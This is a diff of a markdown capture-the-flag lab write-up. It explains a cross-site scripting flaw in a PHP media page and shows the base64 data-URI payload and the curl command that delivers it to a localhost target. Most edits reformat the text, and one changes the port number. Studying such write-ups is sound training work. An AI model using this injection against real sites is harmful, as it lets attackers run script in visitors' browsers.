@@ -7,13 +7,14 @@
 
 page: `http://localhost:8080/index.php?page=media&src=`
 commands:
+
 ```bash
 # Encode the payload
 echo -n '<script>alert(1)</script>' | base64
 # → PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 
 # Inject via data: URI with base64
-curl "http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | grep flag
+curl "http://localhost:8081/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | grep flag
 ```
 
 ## Vulnerability Type
@@ -22,7 +23,7 @@ curl "http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjc
 
 ## Location
 
-```
+```txt
 http://localhost:8081/index.php?page=media&src=
 ```
 
@@ -31,15 +32,18 @@ The homepage links to `?page=media&src=nsa`, which embeds an image using an `<ob
 ## How It Works
 
 1. **Discovery**: On the homepage, there is a link to the media page:
-   ```html
-   <a href="?page=media&src=nsa">
-   ```
+
+```html
+<a href="?page=media&src=nsa">
+```
 
 2. **Normal behavior**: With `src=nsa`, the server renders:
-   ```html
-   <object data="http://10.0.2.15/images/nsa_prism.jpg"></object>
-   ```
-   It maps the short name `nsa` to the image file `nsa_prism.jpg`.
+
+```html
+<object data="http://10.0.2.15/images/nsa_prism.jpg"></object>
+```
+
+It maps the short name `nsa` to the image file `nsa_prism.jpg`.
 
 3. **The vulnerability**: The `src` parameter is injected directly into the `<object data="...">` attribute without proper validation. This allows injecting a `data:` URI to embed arbitrary HTML/JavaScript.
 
